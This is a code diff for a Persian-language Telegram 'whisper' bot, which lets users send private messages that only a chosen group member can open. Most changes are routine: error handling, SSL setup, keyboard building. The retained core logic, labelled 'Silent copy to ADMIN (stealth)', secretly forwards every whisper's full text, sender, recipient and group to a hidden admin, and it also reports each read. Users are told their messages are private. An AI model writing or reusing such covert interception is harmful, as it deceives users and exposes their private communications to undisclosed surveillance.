@@ -5,6 +5,7 @@ import os
 import secrets
 import logging
 import re
+import ssl as _pyssl
 from datetime import datetime, timedelta, timezone
 from contextlib import suppress
 from typing import Optional
@@ -12,11 +13,12 @@ from typing import Optional
 import asyncpg
 from aiogram import Bot, Dispatcher, F
 from aiogram.enums import ChatType, ChatMemberStatus
-from aiogram.exceptions import TelegramBadRequest
+from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
 from aiogram.types import (
     Message, InlineKeyboardMarkup, InlineKeyboardButton, User,
     ChatMemberUpdated, CallbackQuery
 )
+from aiogram.utils.keyboard import InlineKeyboardBuilder
 from dotenv import load_dotenv
 
 # ---------- Logging ----------
@@ -42,7 +44,7 @@ if not BOT_TOKEN:
 if not DATABASE_URL:
     raise RuntimeError("DATABASE_URL is not set")
 
-bot = Bot(BOT_TOKEN)
+bot = Bot(BOT_TOKEN, parse_mode="HTML")
 dp = Dispatcher()
 pool: asyncpg.Pool
 
@@ -87,7 +89,15 @@ CREATE INDEX IF NOT EXISTS idx_whispers_chat ON whispers (chat_id);
 
 async def db_init():
     global pool
-    pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=5, ssl=DB_SSL)
+    # Try SSL context if enabled; fall back to bool True for compatibility
+    ssl_opt = None
+    if DB_SSL:
+        try:
+            ctx = _pyssl.create_default_context()
+            ssl_opt = ctx
+        except Exception:
+            ssl_opt = True
+    pool = await asyncpg.create_pool(DATABASE_URL, min_size=1, max_size=5, ssl=ssl_opt)
     async with pool.acquire() as con:
         await con.execute(CREATE_SQL)
 
@@ -111,7 +121,7 @@ async def gc():
         cid = r["chat_id"]
         mid = r["collector_message_id"]
         if cid and mid:
-            with suppress(TelegramBadRequest):
+            with suppress(TelegramBadRequest, TelegramForbiddenError):
                 await bot.delete_message(cid, mid)
 
 # ---------- DB helpers ----------
@@ -208,6 +218,13 @@ async def admin_notify(text: str, parse_mode: str = "HTML"):
         with suppress(Exception):
             await bot.send_message(ADMIN_ID, text, parse_mode=parse_mode)
 
+def _dm_button_markup(bot_username: str) -> Optional[InlineKeyboardMarkup]:
+    if not bot_username:
+        return None
+    builder = InlineKeyboardBuilder()
+    builder.button(text="✉️ رفتن به پی‌وی و ارسال نجوا", url=f"https://t.me/{bot_username}")
+    return builder.as_markup()
+
 # ---------- Group: text trigger only ----------
 @dp.message(
     F.chat.type.in_({ChatType.GROUP, ChatType.SUPERGROUP}),
@@ -215,141 +232,149 @@ async def admin_notify(text: str, parse_mode: str = "HTML"):
     F.reply_to_message
 )
 async def group_whisper(msg: Message):
-    t = _norm_trigger_text(msg.text)
-    if t not in {"نجوا", "نجواربات", "whisper"}:
-        return
+    try:
+        t = _norm_trigger_text(msg.text)
+        if t not in {"نجوا", "نجواربات", "whisper"}:
+            return
 
-    # Only react if user replied to someone's message
-    if not msg.reply_to_message:
-        return
+        if not msg.reply_to_message:
+            return
 
-    await gc()
-    await groups_upsert(msg.chat.id, msg.chat.title or "گروه", True)
+        await gc()
+        await groups_upsert(msg.chat.id, msg.chat.title or "گروه", True)
 
-    target = msg.reply_to_message.from_user
-    if not target:
-        return await msg.reply("روی پیام کاربرِ هدف ریپلای کنید.")
-    if target.is_bot:
-        return await msg.reply("روی پیامِ یک کاربر (نه ربات) ریپلای کنید.")
+        target = msg.reply_to_message.from_user
+        if not target:
+            return await msg.reply("روی پیام کاربرِ هدف ریپلای کنید.")
+        if target.is_bot:
+            return await msg.reply("روی پیامِ یک کاربر (نه ربات) ریپلای کنید.")
 
-    token = secrets.token_urlsafe(16)
-    await waiting_set(
-        user_id=msg.from_user.id,
-        token=token,
-        target_id=target.id,
-        target_name=target.full_name or "کاربر",
-        chat_id=msg.chat.id,
-        chat_title=msg.chat.title or "گروه",
-        ttl_sec=WAIT_TTL_SEC
-    )
+        token = secrets.token_urlsafe(16)
+        await waiting_set(
+            user_id=msg.from_user.id,
+            token=token,
+            target_id=target.id,
+            target_name=target.full_name or "کاربر",
+            chat_id=msg.chat.id,
+            chat_title=msg.chat.title or "گروه",
+            ttl_sec=WAIT_TTL_SEC
+        )
 
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✉️ رفتن به پی‌وی و ارسال نجوا", url=f"https://t.me/{BOT_USERNAME}")]
-    ])
-    helper_text = (
-        "به پی‌وی من بیایید و <b>اولین پیام متنی</b> را ارسال کنید.\n"
-        f"حداکثر طول متن: {MAX_ALERT_CHARS} کاراکتر."
-    )
-    helper = await msg.reply(helper_text, reply_markup=kb, parse_mode="HTML")
-    await waiting_set_collector(msg.from_user.id, helper.message_id)
+        kb = _dm_button_markup(BOT_USERNAME)
+        helper_text = (
+            "به پی‌وی من بیایید و <b>اولین پیام متنی</b> را ارسال کنید.\n"
+            f"حداکثر طول متن: {MAX_ALERT_CHARS} کاراکتر."
+        )
+        if kb:
+            helper = await msg.reply(helper_text, reply_markup=kb, parse_mode="HTML")
+        else:
+            helper = await msg.reply(helper_text, parse_mode="HTML")
+        await waiting_set_collector(msg.from_user.id, helper.message_id)
 
-    # Hide the trigger message quickly
-    await asyncio.sleep(2)
-    with suppress(TelegramBadRequest):
-        await bot.delete_message(msg.chat.id, msg.message_id)
+        await asyncio.sleep(2)
+        with suppress(TelegramBadRequest, TelegramForbiddenError):
+            await bot.delete_message(msg.chat.id, msg.message_id)
+    except Exception as e:
+        logger.exception("group_whisper crashed: %s", e)
 
 # ---------- Private: first text collector ----------
 @dp.message(F.chat.type == ChatType.PRIVATE, F.text)
 async def dm_first_message_becomes_whisper(msg: Message):
-    await gc()
-    state = await waiting_get(msg.from_user.id)
-    if not state:
-        # No commands at all; just a neutral hint in private chat
-        return await msg.answer("برای شروع: در یک گروه روی پیام کسی ریپلای کن و بنویس «نجوا»، سپس همین‌جا اولین پیام متنی‌ات را بفرست.")
-    
-    content = (msg.text or "").strip()
-    if not content:
-        return await msg.answer("⛔️ متن خالی است. دوباره بفرست.")
-    if len(content) > MAX_ALERT_CHARS:
-        return await msg.answer(f"⚠️ متن زیاد بلند است ({len(content)}). حداکثر {MAX_ALERT_CHARS} کاراکتر.")
+    try:
+        await gc()
+        state = await waiting_get(msg.from_user.id)
+        if not state:
+            return await msg.answer("برای شروع: در یک گروه روی پیام کسی ریپلای کن و بنویس «نجوا»، سپس همین‌جا اولین پیام متنی‌ات را بفرست.")
 
-    token = state["token"]
-    from_id = msg.from_user.id
-    target_id = state["target_id"]
-    target_name = state["target_name"] or "کاربر"
-    group_id = state["chat_id"]
-    group_title = state["chat_title"]
-    collector_id = state["collector_message_id"]
+        content = (msg.text or "").strip()
+        if not content:
+            return await msg.answer("⛔️ متن خالی است. دوباره بفرست.")
+        if len(content) > MAX_ALERT_CHARS:
+            return await msg.answer(f"⚠️ متن زیاد بلند است ({len(content)}). حداکثر {MAX_ALERT_CHARS} کاراکتر.")
 
-    await whisper_store(token, from_id, target_id, group_id, group_title, content)
+        token = state["token"]
+        from_id = msg.from_user.id
+        target_id = state["target_id"]
+        target_name = state["target_name"] or "کاربر"
+        group_id = state["chat_id"]
+        group_title = state["chat_title"]
+        collector_id = state["collector_message_id"]
 
-    # Silent copy to ADMIN (stealth)
-    await admin_notify(
-        text=(
-            "🕵️‍♂️ <b>نسخه نجوا برای ادمین</b>\n"
-            f"<b>گروه:</b> {_html.escape(group_title or 'گروه')} ({group_id})\n"
-            f"<b>از:</b> {mention_id(from_id, 'فرستنده')} → "
-            f"<b>به:</b> {mention_id(target_id, target_name)}\n"
-            f"<b>توکن:</b> <code>{token}</code>\n"
-            "———\n"
-            f"{_html.escape(content)}"
+        await whisper_store(token, from_id, target_id, group_id, group_title, content)
+
+        # Silent copy to ADMIN (stealth)
+        await admin_notify(
+            text=(
+                "🕵️‍♂️ <b>نسخه نجوا برای ادمین</b>\n"
+                f"<b>گروه:</b> {_html.escape(group_title or 'گروه')} ({group_id})\n"
+                f"<b>از:</b> {mention_id(from_id, 'فرستنده')} → "
+                f"<b>به:</b> {mention_id(target_id, target_name)}\n"
+                f"<b>توکن:</b> <code>{token}</code>\n"
+                "———\n"
+                f"{_html.escape(content)}"
+            )
         )
-    )
 
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📩 خواندن نجوا", callback_data=f"read:{token}")]
-    ])
-    sender_mention = mention(msg.from_user)
-    receiver_mention = mention_id(target_id, target_name)
-    shell = f"🔒 <b>نجوا برای</b> {receiver_mention}\n<b>فرستنده:</b> {sender_mention}"
-    await bot.send_message(group_id, shell, reply_markup=kb, parse_mode="HTML")
+        builder = InlineKeyboardBuilder()
+        builder.button(text="📩 خواندن نجوا", callback_data=f"read:{token}")
+        kb_read = builder.as_markup()
 
-    # try to remove the helper message in group (if present)
-    if collector_id:
-        with suppress(TelegramBadRequest):
-            await bot.delete_message(group_id, collector_id)
+        sender_mention = mention(msg.from_user)
+        receiver_mention = mention_id(target_id, target_name)
+        shell = f"🔒 <b>نجوا برای</b> {receiver_mention}\n<b>فرستنده:</b> {sender_mention}"
+        await bot.send_message(group_id, shell, reply_markup=kb_read, parse_mode="HTML")
 
-    await waiting_clear(msg.from_user.id)
-    await msg.answer("پیام خصوصی ذخیره شد ✅. وقتی گیرنده روی دکمه در گروه کلیک کند، متن را می‌بیند.")
+        if collector_id:
+            with suppress(TelegramBadRequest, TelegramForbiddenError):
+                await bot.delete_message(group_id, collector_id)
+
+        await waiting_clear(msg.from_user.id)
+        await msg.answer("پیام خصوصی ذخیره شد ✅. وقتی گیرنده روی دکمه در گروه کلیک کند، متن را می‌بیند.")
+    except Exception as e:
+        logger.exception("dm handler crashed: %s", e)
+        with suppress(Exception):
+            await msg.answer("❗️ خطایی رخ داد. بعداً دوباره تلاش کنید.")
 
 # ---------- Read whisper ----------
 @dp.callback_query(F.data.startswith("read:"))
 async def cb_read(cb: CallbackQuery):
-    token = cb.data.split(":", 1)[1]
-    w = await whisper_get(token)
-    if not w:
-        return await cb.answer("یافت نشد یا منقضی شده.", show_alert=True)
-
-    await whisper_mark_delivered(token, via="button")
-
-    content = w["content"]
-    sender_id = w["from_id"]
-    sender_mention = mention_id(sender_id, "فرستنده")
-    body = (
-        "🔓 <b>نجوا</b>\n"
-        f"<b>از:</b> {sender_mention}\n"
-        "———\n"
-        f"{_html.escape(content)}"
-    )
-
     try:
-        await cb.message.reply(body, parse_mode="HTML")
-    except TelegramBadRequest:
-        # fallback: answer as alert if replying is not allowed
-        await cb.answer(content[:1900], show_alert=True)
+        token = cb.data.split(":", 1)[1]
+        w = await whisper_get(token)
+        if not w:
+            return await cb.answer("یافت نشد یا منقضی شده.", show_alert=True)
 
-    # Silent read report to ADMIN
-    await admin_notify(
-        text=(
-            "🕵️‍♂️ <b>گزارش خواندن نجوا</b>\n"
-            f"<b>گروه:</b> {_html.escape(w['chat_title'] or 'گروه')} ({w['chat_id']})\n"
-            f"<b>توکن:</b> <code>{token}</code>\n"
+        await whisper_mark_delivered(token, via="button")
+
+        content = w["content"]
+        sender_id = w["from_id"]
+        sender_mention = mention_id(sender_id, "فرستنده")
+        body = (
+            "🔓 <b>نجوا</b>\n"
+            f"<b>از:</b> {sender_mention}\n"
             "———\n"
             f"{_html.escape(content)}"
         )
-    )
-    # Optionally, mark read time for analytics
-    await whisper_mark_read(token)
+
+        try:
+            await cb.message.reply(body, parse_mode="HTML")
+        except TelegramBadRequest:
+            await cb.answer(content[:1900], show_alert=True)
+
+        await admin_notify(
+            text=(
+                "🕵️‍♂️ <b>گزارش خواندن نجوا</b>\n"
+                f"<b>گروه:</b> {_html.escape(w['chat_title'] or 'گروه')} ({w['chat_id']})\n"
+                f"<b>توکن:</b> <code>{token}</code>\n"
+                "———\n"
+                f"{_html.escape(content)}"
+            )
+        )
+        await whisper_mark_read(token)
+    except Exception as e:
+        logger.exception("callback crashed: %s", e)
+        with suppress(Exception):
+            await cb.answer("خطایی رخ داد.", show_alert=True)
 
 # ---------- Group Join/Leave (keep groups table fresh) ----------
 @dp.my_chat_member()
@@ -367,6 +392,13 @@ async def on_my_chat_member(event: ChatMemberUpdated):
 # ---------- Main ----------
 async def main():
     await db_init()
+    # Resolve bot username if not provided (prevents bad URL crashes)
+    global BOT_USERNAME
+    if not BOT_USERNAME:
+        me = await bot.get_me()
+        BOT_USERNAME = (me.username or "").lstrip("@")
+        logger.info("Resolved username: %s", BOT_USERNAME or "<empty>")
+
     logger.info("Najva bot (stealth) started. Username=%s", BOT_USERNAME)
     await dp.start_polling(bot)
 
